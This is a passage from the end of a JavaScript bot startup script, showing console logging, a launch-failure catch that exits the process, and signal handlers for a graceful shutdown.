    console.log('🔍 Waiting for commands...');
    console.log('');
  })
  .catch(err => {
    console.error('═══════════════════════════════════════════════════════════');
    console.error('❌ Failed to start bot:', err);
    console.error('═══════════════════════════════════════════════════════════');
    process.exit(1);
  });

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
